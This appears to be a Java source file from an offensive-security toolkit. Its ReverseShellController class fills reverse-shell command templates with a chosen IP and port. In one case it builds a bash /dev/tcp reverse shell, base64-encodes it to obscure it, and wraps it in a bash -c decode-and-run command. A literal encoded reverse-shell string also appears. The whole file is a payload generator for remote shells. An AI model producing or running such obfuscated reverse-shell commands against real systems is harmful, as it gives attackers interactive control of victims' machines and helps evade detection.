package com.sec421.controller.baseTools;
/**
 * @author 0x421
 * @date 2023/12/28 11:20
 * @github https://github.com/0x7eTeam
 */
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;

public class ReverseShellController {
    public String ReverseShell(HashMap hashMap, String str){
        str = str.replace("127.0.0.1",hashMap.get("ip").toString());
        str = str.replace("8080",hashMap.get("port").toString());
        if (str.equals("bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODA4MCAwPiYx}|{base64,-d}|{bash,-i}'")){
            String temp = "bash -i >& /dev/tcp/"+hashMap.get("ip").toString()+"/"+hashMap.get("port").toString()+" 0>&1";
            String encodedString = Base64.getEncoder().encodeToString(temp.getBytes(StandardCharsets.UTF_8));
            return "bash -c '{echo,"+encodedString+"}|{base64,-d}|{bash,-i}'";
        }
        return str;
    }
}
